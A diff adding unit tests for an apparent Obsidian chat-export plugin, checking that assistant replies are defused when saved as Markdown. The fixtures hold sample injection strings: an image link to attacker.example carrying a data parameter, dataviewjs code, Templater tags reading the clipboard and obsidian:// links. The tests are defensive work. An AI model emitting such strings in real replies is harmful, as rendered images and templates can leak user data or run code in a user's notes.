@@ -96,3 +96,38 @@ describe("closeOpenFence", () => {
 		expect(markdown).toContain("print(1)\n```\n\n---\n\n## You");
 	});
 });
+
+describe("conversationToMarkdown: model output is defused", () => {
+	test("assistant turns lose remote images, plugin code blocks and template tags, user turns are written as typed", () => {
+		const user = "Please keep ![x](https://attacker.example/p) and <% tp.date.now() %> in my question";
+		const assistant = "![chart](https://attacker.example/p?d=1)\n\n```dataviewjs\ndv.paragraph(1)\n```\n\n<% tp.system.clipboard() %>\n\n[go](obsidian://open?vault=x)";
+		const markdown = conversationToMarkdown([{ role: "user", text: user }, { role: "assistant", text: assistant }], meta);
+		const [youPart, assistantPart] = markdown.split("## AskMate");
+		expect(youPart).toContain(user);
+		expect(assistantPart).not.toMatch(/(?<!\\)!\[[^\]]*\]\(https?:/);
+		expect(assistantPart).not.toContain("```dataviewjs");
+		expect(assistantPart).not.toContain("<%");
+		expect(assistantPart).not.toContain("](obsidian://");
+		expect(assistantPart).toContain("[Remote image: chart](https://attacker.example/p?d=1)");
+	});
+
+	test("ordinary assistant Markdown is unchanged", () => {
+		const text = "## Summary\n\n- Costs fell\n\n```ts\nconst a = 1;\n```\n\n| a | b |\n| - | - |\n| 1 | 2 |";
+		expect(conversationToMarkdown([{ role: "assistant", text }], meta)).toContain(`## AskMate (gpt-5.5)\n\n${text}\n`);
+	});
+
+	test("an unclosed fence in a reply is still closed after defusing", () => {
+		const markdown = conversationToMarkdown([{ role: "assistant", text: "```dataviewjs\ndv.paragraph(1)" }, { role: "user", text: "Next" }], meta);
+		expect(markdown).toContain("```text\ndv.paragraph(1)\n```\n\n---\n\n## You");
+	});
+});
+
+describe("conversationToMarkdown: source note links", () => {
+	test("uses the caller's link builder, and falls back to a wikilink when it has none", () => {
+		const messages: ChatMessage[] = [{ role: "user", text: "Q", sourcePath: "Projects/Plan.md" }];
+		const custom = conversationToMarkdown(messages, { ...meta, linkFor: (path) => `[Plan](${path.replace(/ /g, "%20")})` });
+		expect(custom).toContain("Source note: [Plan](Projects/Plan.md)");
+		expect(conversationToMarkdown(messages, { ...meta, linkFor: () => null })).toContain("Source note: [[Projects/Plan]]");
+		expect(conversationToMarkdown(messages, meta)).toContain("Source note: [[Projects/Plan]]");
+	});
+});
